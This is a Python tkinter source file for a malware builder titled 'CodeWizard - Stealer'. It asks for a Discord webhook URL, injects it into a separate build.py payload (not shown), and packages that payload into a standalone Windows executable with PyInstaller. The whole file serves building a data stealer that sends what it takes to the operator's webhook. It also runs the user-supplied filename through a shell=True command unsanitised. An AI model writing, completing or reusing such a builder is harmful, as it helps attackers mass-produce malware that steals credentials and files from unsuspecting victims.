import tkinter as tk
from tkinter import ttk
import subprocess
import os

# Function to generate the executable file
def generate_exe():
    webhook_url = webhook_url_entry.get()
    filename = filename_entry.get() + ".exe"  # Append .exe to the user-specified filename
    
    # Create a modified version of your_script.py with the user-provided webhook URL
    with open('build.py', 'r') as script_file:
        script_content = script_file.read()
        modified_script_content = script_content.replace("webhook_url = ''", f'webhook_url = "{webhook_url}"')

    # Save the modified script with a temporary filename
    with open('temp_script.py', 'w') as temp_file:
        temp_file.write(modified_script_content)

    try:
        # Execute the PyInstaller command to generate the executable from the modified script
        subprocess.run(f'pyinstaller --onefile --name "{filename}" temp_script.py', shell=True)
        result_label.config(text=f"Executable '{filename}' generated successfully!")
    except Exception as e:
        result_label.config(text=f"Error: {e}")
    finally:
        # Re-enable the "Generate Executable" button when the task is complete
        generate_button.config(state=tk.NORMAL)
        
        # Delete the temporary script file
        os.remove('temp_script.py')  # Delete the temp_script.py file

# Create the main application window
app = tk.Tk()
app.title("CodeWizard - Stealer")

# Set the window size and make it non-resizable
app.geometry("500x300")  # Adjusted window size to accommodate the button
app.resizable(False, False)  # Disable resizing in both directions

# Define a dark theme color scheme
bg_color = "#2E2E2E"
fg_color = "#FFFFFF"
entry_bg_color = "#444444"
button_bg_color = "#606060"
button_fg_color = "#FFFFFF"

# Apply the dark theme
app.configure(bg=bg_color)

# Create and arrange GUI elements with the dark theme
webhook_url_label = tk.Label(app, text="Discord Webhook URL:", bg=bg_color, fg=fg_color)
webhook_url_label.pack()

webhook_url_entry = tk.Entry(app, width=50, bg=entry_bg_color, fg=fg_color)
webhook_url_entry.pack()

filename_label = tk.Label(app, text="Filename for Build", bg=bg_color, fg=fg_color)
filename_label.pack()

filename_entry = tk.Entry(app, width=30, bg=entry_bg_color, fg=fg_color)
filename_entry.pack()

# Adjust the position of the "Generate Executable" button
generate_button = tk.Button(app, text="Generate Build", command=generate_exe, bg=button_bg_color, fg=button_fg_color)
generate_button.place(relx=0.5, rely=0.7, anchor="center")  # Move the button down

result_label = tk.Label(app, text="", bg=bg_color, fg=fg_color)
result_label.pack()

app.iconbitmap("icon.ico")

# Start the GUI application
app.mainloop()
